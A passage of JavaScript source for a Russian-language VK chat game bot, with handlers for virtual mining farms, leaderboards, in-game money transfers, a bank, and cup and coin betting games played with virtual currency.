if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let list = ``
for(let o in cars){
list += `\n🔸 ${cars[o].id}. ${cars[o].name} [${utils.sp(cars[o].cost)}$]`	
}
return context.send(`${nick}, машины: ${list}\n\n❓ Для покупки введите «машина [номер]»`)
})

updates.hear(/фермы 1 (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`Упс... Я не знаю такой команды 😟`)
if(context.$match[1] < 1) return context.send(`Упс... Я не знаю такой команды 😟`)
let colvo = Number(context.$match[1])
if(user.farmid > 0 && user.farmid !== 1) return context.send(`${nick}, вы не можете купить разные фермы 😒
❓ Продайте ферму с помощью команды «Продать ферму [кол-во]»`)
let price = 20500000
price *= Number(colvo)
if(user.balance < Number(price)) return context.send(`${nick}, у вас мало денег для этой покупки 😔`)
let prew = user.farms
prew += Number(colvo)
if(user.rank == 1 && prew > Number(1000)) return context.send(`${nick}, у Вас не может быть больше 1,000 ферм 😔`)
if(user.rank == 2 && prew > Number(2000)) return context.send(`${nick}, у Вас не может быть больше 2,000 ферм 😔`)
if(user.rank == 3 && prew > Number(5000)) return context.send(`${nick}, у Вас не может быть больше 5,000 ферм 😔`)
user.balance -= Number(price)
user.farmid = 1
user.farms += Number(colvo)
user.farmname = `6U Nvidia`
return context.send(`${nick}, вы купили «6U Nvidia» (x${colvo}) за ${utils.sp(price)}$`)
})

updates.hear(/фермы 2 (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`Упс... Я не знаю такой команды 😟`)
if(context.$match[1] < 1) return context.send(`Упс... Я не знаю такой команды 😟`)
let colvo = Number(context.$match[1])
if(user.farmid > 0 && user.farmid !== 2) return context.send(`${nick}, вы не можете купить разные фермы 😒
❓ Продайте ферму с помощью команды «Продать ферму [кол-во]»`)
let price = 100000000
price *= Number(colvo)
if(user.balance < Number(price)) return context.send(`${nick}, у вас мало денег для этой покупки 😔`)
let prew = user.farms
prew += Number(colvo)
if(user.rank == 1 && prew > Number(1000)) return context.send(`${nick}, у Вас не может быть больше 1,000 ферм 😔`)
if(user.rank == 2 && prew > Number(2000)) return context.send(`${nick}, у Вас не может быть больше 2,000 ферм 😔`)
if(user.rank == 3 && prew > Number(5000)) return context.send(`${nick}, у Вас не может быть больше 5,000 ферм 😔`)
user.balance -= Number(price)
user.farmid = 2
user.farms += Number(colvo)
user.farmname = `AntminerS9`
return context.send(`${nick}, вы купили «AntminerS9» (x${colvo}) за ${utils.sp(price)}$`)
})

updates.hear(/фермы 3 (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`Упс... Я не знаю такой команды 😟`)
if(context.$match[1] < 1) return context.send(`Упс... Я не знаю такой команды 😟`)
let colvo = Number(context.$match[1])
if(user.farmid > 0 && user.farmid !== 3) return context.send(`${nick}, вы не можете купить разные фермы 😒
❓ Продайте ферму с помощью команды «Продать ферму [кол-во]»`)
let price = 900000000
price *= Number(colvo)
if(user.balance < Number(price)) return context.send(`${nick}, у вас мало денег для этой покупки 😔`)
let prew = user.farms
prew += Number(colvo)
if(user.rank == 1 && prew > Number(1000)) return context.send(`${nick}, у Вас не может быть больше 1,000 ферм 😔`)
if(user.rank == 2 && prew > Number(2000)) return context.send(`${nick}, у Вас не может быть больше 2,000 ферм 😔`)
if(user.rank == 3 && prew > Number(5000)) return context.send(`${nick}, у Вас не может быть больше 5,000 ферм 😔`)
user.balance -= Number(price)
user.farmid = 3
user.farms += Number(colvo)
user.farmname = `FM2018-BT200`
return context.send(`${nick}, вы купили «FM2018-BT200» (x${colvo}) за ${utils.sp(price)}$`)
})

updates.hear(/продать фермы (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`Упс... Я не знаю такой команды 😟`)
if(context.$match[1] < 1) return context.send(`Упс... Я не знаю такой команды 😟`)
	let sell = Number(context.$match[1])
	if(user.farms < Number(sell)) return context.send(`${nick}, у вас нет столько ферм 😟
❓ Для покупки введите «Фермы»`)
let price = 0
if(user.farmid == 1) price = 14350000
if(user.farmid == 2) price = 70000000
if(user.farmid == 3) price = 630000000

	price *= Number(sell)
	user.farms -= Number(sell)
	user.balance += Number(price)
	if(user.farms < 1) user.farmid = 0
	return context.send(`${nick}, вы продали свои фермы (x${sell}) за ${utils.sp(price)}$ 🙂`)
})


updates.hear(/продать ферму$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let sell = 1
	if(user.farms < Number(1)) return context.send(`${nick}, у вас нет ферм 😟
❓ Для покупки введите «Фермы»`)
let price = 0
if(user.farmid == 1) price = 14350000
if(user.farmid == 2) price = 70000000
if(user.farmid == 3) price = 630000000

	price *= Number(sell)
	user.farms -= Number(sell)
	user.balance += Number(price)
	if(user.farms < 1) user.farmid = 0
	return context.send(`${nick}, вы продали свою ферму за ${utils.sp(price)}$ 🙂`)
})


updates.hear(/фермы$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, майнинг фермы:
🔸 1. 6U Nvidia 2₿/час [20.500.000$]
🔸 2. AntminerS9 10₿/час [100.000.000$]
🔸 3. FM2018-BT200 100₿/час [900.000.000$]

❓ Для покупки введите «Фермы [номер] [кол-во]»`)
})

updates.hear(/ферма|собрать биткоины$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.farms < Number(1)) return context.send(`${nick}, у вас нет фермы, купить её можно в магазине 😞`)
	if(user.farm_btc < Number(1)) return context.send(`${nick}, на вашей ферме пусто, новые биткоины появятся через ${nols(Math.trunc(user.farmtime / 60 % 60)) +  ':' + nols(user.farmtime % 60)}`)
	user.btc += Number(user.farm_btc)
let btc = user.farm_btc
user.farm_btc = 0
return context.send(`${nick}, Вы собрали ${utils.sp(btc)}₿, следующие биткоины появятся через час 👍
🌐 Биткоинов: ${utils.sp(user.btc)}₿`)
})

updates.hear(/биткоин$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, у вас ${utils.sp(user.btc)}₿ 🙂`)
})
updates.hear(/баланс$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let text = `${utils.sp(user.balance)}$`
text += `\n💳 В банке: ${utils.sp(user.bank)}`
if(user.btc > 0) text += `\n🌐 Биткоинов: ${utils.sp(user.btc)}₿`
return context.send({message: `${nick}, на руках ${text}`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📒 Профиль', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💰 Банк', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🌐 Биткоин', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🔋 Собрать биткоины', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      	[
      	Keyboard.textButton({ 
        label: '🎁 Получить бонус', 
        color: Keyboard.POSITIVE_COLOR,
        }),
        Keyboard.textButton({ 
        label: '◀ В главное меню', 
        color: Keyboard.SECONDARY_COLOR,
        })

        ]
     ])
     .inline(platform)
  })
})

updates.hear(/клан топ$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    let top = []
    let topme = [] // создание масива

    for (let i in clan){// перебор базы данных
        top.push({
            id: i,
            name: clan[i].name,
            player: clan[i].player,
            balance: clan[i].rating // создание массива

        })
    
    }


    top.sort(function(a, b) { 
if (b.balance > a.balance) return 1 
if (b.balance < a.balance) return -1 
return 0
}); //Сортировка

let text = ""
for (let s = 0; s < top.length; s++){
    topme.push(top[s].id)
}

if (top.length < 10){
    for (let j = 0; j < top.length; j++){
    	j + 1
    	let b = `${j}`
    	b = b.replace("9", "🔟")
    	b = b.replace("8", "9⃣")
    	b = b.replace("7", "8⃣")
    	b = b.replace("6", "7⃣")
    	b = b.replace("5", "6⃣")
    	b = b.replace("4", "5⃣")
    	b = b.replace("3", "4⃣")
    	b = b.replace("2", "3⃣")
    	b = b.replace("1", "2⃣")
    	b = b.replace("0", "1⃣")
        text += `[${clan[top[j].id].player}/50] [id${base.bs[clan[top[j].id].owner].id}|${clan[top[j].id].name}] — 👑${utils.rn(clan[top[j].id].rating)}\n`
    }
} else {
    for (let j = 0; j < 10; j++){
    	j + 1
    	let b = `${j}`
    	b = b.replace("9", "🔟")
    	b = b.replace("8", "9⃣")
    	b = b.replace("7", "8⃣")
    	b = b.replace("6", "7⃣")
    	b = b.replace("5", "6⃣")
    	b = b.replace("4", "5⃣")
    	b = b.replace("3", "4⃣")
    	b = b.replace("2", "3⃣")
    	b = b.replace("1", "2⃣")
    	b = b.replace("0", "1⃣")
        text += (b) + `>> [${clan[top[j].id].player}/50] [id${base.bs[clan[top[j].id].owner].id}|${clan[top[j].id].name}] — 👑${utils.rn(clan[top[j].id].rating)}\n`
    }
} 

    return context.send(`${nick}, топ кланов: \n${text}\n📢 Рейтинг клана складывается из побед и поражений.`) 

})


updates.hear(/топ$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    let top = []
    let topme = [] // создание масива

    for (let i in base.bs){// перебор базы данных
    	if(base.bs[i].topenabled == true && base.bs[i].rank < 4){
        top.push({
            id: i,
            name: base.bs[i].nick,
            balance: base.bs[i].rating // создание массива

        })
    }
    }


    top.sort(function(a, b) { 
if (b.balance > a.balance) return 1 
if (b.balance < a.balance) return -1 
return 0
}); //Сортировка

let text = ""
for (let s = 0; s < top.length; s++){
    topme.push(top[s].id)
}

if (top.length < 10){
    for (let j = 0; j < top.length; j++){
    	j + 1
    	let b = `${j}`
    	b = b.replace("9", "🔟")
    	b = b.replace("8", "9⃣")
    	b = b.replace("7", "8⃣")
    	b = b.replace("6", "7⃣")
    	b = b.replace("5", "6⃣")
    	b = b.replace("4", "5⃣")
    	b = b.replace("3", "4⃣")
    	b = b.replace("2", "3⃣")
    	b = b.replace("1", "2⃣")
    	b = b.replace("0", "1⃣")
        text += `${b} [id${base.bs[top[j].id].id}|${top[j].name}] — 👑${utils.rn(top[j].balance)}\n`
    }
} else {
    for (let j = 0; j < 10; j++){
    	j + 1
    	let b = `${j}`
    	b = b.replace("9", "🔟")
    	b = b.replace("8", "9⃣")
    	b = b.replace("7", "8⃣")
    	b = b.replace("6", "7⃣")
    	b = b.replace("5", "6⃣")
    	b = b.replace("4", "5⃣")
    	b = b.replace("3", "4⃣")
    	b = b.replace("2", "3⃣")
    	b = b.replace("1", "2⃣")
    	b = b.replace("0", "1⃣")
        text += `${b} [id${base.bs[top[j].id].id}|${top[j].name}] — 👑${utils.rn(top[j].balance)}\n`
    }
} 

    return context.send(`${nick}, топ игроков: \n${text}`) 

})

updates.hear(/продать рейтинг ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let colvo = Number(context.$match[1])
	if(user.rating < Number(colvo)) return context.send(`${nick}, у вас недостаточно рейтинга (${utils.sp(user.rating)}👑) ☹`)
	let price = Number(150000000)
    let cost = price
    cost *= Number(colvo)
    user.balance += Number(cost)
    user.rating -= Number(colvo)
    return context.send(`${nick}, вы продали ${utils.sp(colvo)} рейтинга за ${utils.sp(cost)}$`)
})

updates.hear(/продать рейтинг$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let colvo = Number(1)
	if(user.rating < Number(colvo)) return context.send(`${nick}, у вас недостаточно рейтинга ☹`)
	let price = Number(150000000)
    let cost = price
    cost *= Number(colvo)
    user.balance += Number(cost)
    user.rating -= Number(colvo)
    return context.send(`${nick}, вы продали ${utils.sp(colvo)} рейтинг за ${utils.sp(cost)}$`)
})



updates.hear(/рейтинг ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let price = Number(250000000)
let colvo = Number(context.$match[1])
let cost = price
cost *= Number(colvo)
if(user.balance < Number(cost)) return context.send(`${nick}, у вас недостаточно денег 😟
💰 Баланс: ${utils.sp(user.balance)}$`)
user.balance -= Number(cost)
user.rating += Number(colvo)
return context.send(`${nick}, вы повысили свой рейтинг на ${utils.sp(colvo)}👑 за ${utils.sp(cost)}$ 👍
👑 Рейтинг: ${utils.sp(user.rating)}
💰 Баланс: ${utils.sp(user.balance)}$`)
}) 

updates.hear(/рейтинг$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rating < 1) return context.send(`${nick}, у вас нет рейтинга`)
return context.send(`${nick}, ваш рейтинг: ${utils.sp(user.rating)}👑`)

})

updates.hear(/передать ([0-9]+) (.*)$/i,(context, ctx) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.payban == true) return context.send(`${nick}, у Вас бан передачи 😯`)
if(!Number(context.$match[1])) return context.send(`${nick}, неверный ID игрока 😔`)
let bb = Number(context.$match[1])
if(!base.bs[bb]) return context.send(`${nick}, неверный ID игрока 😔`)
if(bb == base.id[context.senderId].id) return context.send(`${nick}, неверный ID игрока 😔`)
if(base.bs[bb].payban == true) return context.send(`${nick}, у *id${base.bs[bb].id} (Пользователя) бан передачи 😯`) 
let res = context.$match[2]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
if(!Number(res)) return context.send(`${nick}, для передачи введите «передать [игровой ID] [сумма]». Пример: «передать 1448393 33к»`)
res = Number(res)
let limit = Number(user.paylimit)
limit += Number(res)
let maxlimit = 0
if(user.rank == 1) maxlimit += Number(5000000000)
if(user.rank == 2) maxlimit += Number(25000000000)
if(user.rank == 3) maxlimit += Number(50000000000)
if(user.rank == 4) maxlimit += Number(5000000000000)
if(user.rank == 5) maxlimit += Number(25000000000000)
if(user.rank > 6) maxlimit += Number(500000000000000000)
if(user.paylimit == maxlimit) return context.send(`${nick}, достигнут лимит передачи денег, Вы сможете передавать через ${nols(Math.trunc(user.paytime / 60))}:00:00`)
if(user.paylimit > maxlimit) return context.send(`${nick}, достигнут лимит передачи денег, Вы сможете передавать через ${nols(Math.trunc(user.paytime / 60))}:00:00`)
let backlimit = maxlimit
backlimit -= Number(user.paylimit)
if(limit > Number(maxlimit)) {
	res = Number(backlimit)
}
if(user.balance < Number(res)) return context.send(`${nick}, недостаточно денег 
💰 Баланс: ${utils.sp(user.balance)}$`)
if(user.tlgrmid > 0 && user.tlgrmpayacces == true) {
user.tlgrmpaycount = Number(res)
user.tlgrmpayid = Number(bb)
let rid = getRandomInRange(1, 1000000)
telegram.sendMessage(user.tlgrmid, `> Создан новый запрос на передачу.
👤 Кому перевод: ${base.bs[bb].nick}
💰 Сумма перевода: ${utils.sp(res)}
⛱ ID перевода: ${rid}
[✅]-> подтвердите передачу командой /sendpay 🌀`)
return context.send(`${nick}, создан новый запрос на передачу.
👤 Кому перевод: *id${base.bs[bb].id} (${base.bs[bb].nick})
💰 Сумма перевода: ${utils.sp(res)}
⛱ ID перевода: ${rid}
[✅]-> подтвердите передачу в Telegram 🌀`)
}
 let months = new Date().getMonth()
    let days = new Date().getDate()
    let hour = new Date().getHours()
    let minute = new Date().getMinutes()
    let second = new Date().getSeconds()
user.paylimit += Number(res)
user.balance -= Number(res)
user.payalltime += Number(res)
base.bs[bb].balance += Number(res)
user.lastpay = `${nols(days)}.${nols(months)}.${new Date().getFullYear()}, ${nols(hour)}:${nols(minute)}:${nols(second)}`
if(base.bs[bb].notifications == true) {
  	vk.api.messages.send({user_id: base.bs[bb].id, message: `[УВЕДОМЛЕНИЕ]
▶ Игрок ${nick} перевел вам ${utils.sp(res)}$!
🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`})
}
return context.send(`${nick}, вы передали игроку *id${base.bs[bb].id} (${base.bs[bb].nick}) ${utils.sp(res)}$`)

})

updates.hear(/передать$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
 return context.send(`${nick}, используйте команду «Передать [игровой ID] [Сумма]» 👍`)
})

updates.hear(/банк снять (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
	while(res.includes(`всё`)){
		res = res.replace(`всё`,`${user.balance}`)
	}
	while(res.includes(`все`)){
		res = res.replace(`все`,`${user.balance}`)
	}
	while(res.includes(`вабанк`)){
		res = res.replace(`вабанк`,`${user.balance}`)
	}
if(!Number(res)) return context.send(`${nick}, на банковском счёте: ${utils.sp(user.bank)}$`)
if(user.bank < Number(res)) return context.send(`${nick}, на счету недостаточно денег`)
user.bank -= Number(res)
user.balance += Number(res)
return context.send(`${nick}, вы сняли со своего счёта ${utils.sp(res)}$ 👍
💳 Сумма в банке: ${utils.sp(user.bank)}$
💰 Баланс: ${utils.sp(user.balance)}$`)

})

updates.hear(/стакан ([1-3]) (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[2]
res = res.replace(".", "");
res = res.replace("кккк", "000000000000");
res = res.replace("ккк", "000000000");
res = res.replace("кк", "000000");
res = res.replace("к", "000");
if(!Number(res)) return context.send(`${nick}, введите номер стаканчика от 1 до 3 👍`)
if(user.balance < Number(res)) return context.send(`${nick}, у вас недостаточно денег😞
💰 Баланс: ${utils.sp(user.balance)}$`)
let lose = getRandomInRange(1, 2)
if(lose == 1) lose = `неправильно`
if(lose == 2) lose = `вы не угадали`
let ctakan = getRandomInRange(1, 3)
let choose = Number(context.$match[1])
if(ctakan !== Number(choose)) {
	user.balance -= Number(res)
	return context.send(`${nick}, ${lose}, это был ${ctakan}-й стаканчик 😟
💰 Баланс: ${utils.sp(user.balance)}$`)
}
let prize = Number(res)
let pprize = Number(res)
pprize /= Number(2)
prize += Number(pprize)
prize = Math.trunc(prize)
user.balance += Number(prize)
return context.send(`${nick}, вы угадали! Приз ${utils.sp(prize)}$ 
💰 Баланс: ${utils.sp(user.balance)}$`)



})


updates.hear(/Стаканчик ([1-3]) (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[2]
res = res.replace(".", "");
res = res.replace("кккк", "000000000000");
res = res.replace("ккк", "000000000");
res = res.replace("кк", "000000");
res = res.replace("к", "000");
if(!Number(res)) return context.send(`${nick}, введите номер стаканчика от 1 до 3 👍`)
if(user.balance < Number(res)) return context.send(`${nick}, у вас недостаточно денег😞
💰 Баланс: ${utils.sp(user.balance)}$`)
let lose = getRandomInRange(1, 2)
if(lose == 1) lose = `неправильно`
if(lose == 2) lose = `вы не угадали`
let ctakan = getRandomInRange(1, 3)
let choose = Number(context.$match[1])
if(ctakan !== Number(choose)) {
	user.balance -= Number(res)
	return context.send(`${nick}, ${lose}, это был ${ctakan}-й стаканчик 😟
💰 Баланс: ${utils.sp(user.balance)}$`)
}
let prize = Number(res)
let pprize = Number(res)
pprize /= Number(2)
prize += Number(pprize)
prize = Math.trunc(prize)
user.balance += Number(prize)
return context.send(`${nick}, вы угадали! Приз ${utils.sp(prize)}$ 
💰 Баланс: ${utils.sp(user.balance)}$`)



})


updates.hear(/банк пополнить (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
	while(res.includes(`всё`)){
		res = res.replace(`всё`,`${user.balance}`)
	}
	while(res.includes(`все`)){
		res = res.replace(`все`,`${user.balance}`)
	}
	while(res.includes(`вабанк`)){
		res = res.replace(`вабанк`,`${user.balance}`)
	}
if(!Number(res)) return context.send(`${nick}, на банковском счёте: ${utils.sp(user.bank)}$`)
if(user.balance < Number(res)) return context.send(`${nick}, у вас не хватает денег`)
user.balance -= Number(res)
user.bank += Number(res)
return context.send(`${nick}, счёт пополнен на ${utils.sp(res)}$ 
💳 Сумма в банке: ${utils.sp(user.bank)}$
💰 Баланс: ${utils.sp(user.balance)}$`)

})


updates.hear(/банк (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
	while(res.includes(`всё`)){
		res = res.replace(`всё`,`${user.balance}`)
	}
	while(res.includes(`все`)){
		res = res.replace(`все`,`${user.balance}`)
	}
	while(res.includes(`вабанк`)){
		res = res.replace(`вабанк`,`${user.balance}`)
	}
if(!Number(res)) return context.send(`${nick}, на банковском счёте: ${utils.sp(user.bank)}$`)
if(user.balance < Number(res)) return context.send(`${nick}, у вас не хватает денег`)
user.balance -= Number(res)
user.bank += Number(res)
return context.send(`${nick}, счёт пополнен на ${utils.sp(res)}$ 
💳 Сумма в банке: ${utils.sp(user.bank)}$
💰 Баланс: ${utils.sp(user.balance)}$`)

})





updates.hear(/банк$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, на банковском счёте: ${utils.sp(user.bank)}$`)

})

updates.hear(/монетка решка (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[1]
res = res.replace(".", "");
res = res.replace("кккк", "000000000000");
res = res.replace("ккк", "000000000");
res = res.replace("кк", "000000");
res = res.replace("к", "000");
if(!Number(res)) return context.send(`Упс... Я не знаю такой команды 🙁`)
res = Number(res)
if(res < Number(250)) return context.send(`${nick}, минимальная ставка 250$ 😔`)
if(user.balance < Number(res)) return context.send(`${nick}, у вас не хватает денег 😞
💰 Баланс: ${utils.sp(user.balance)}$`)
let win = getRandomInRange(1, 3)
context.send(`${nick}, ставка ${utils.sp(res)}$ на решку сделана 
⏳ Ожидайте... `)
let time = getRandomInRange(1, 5)
time *= Number(1000)
if(win == 1) {
user.balance -= Number(res)
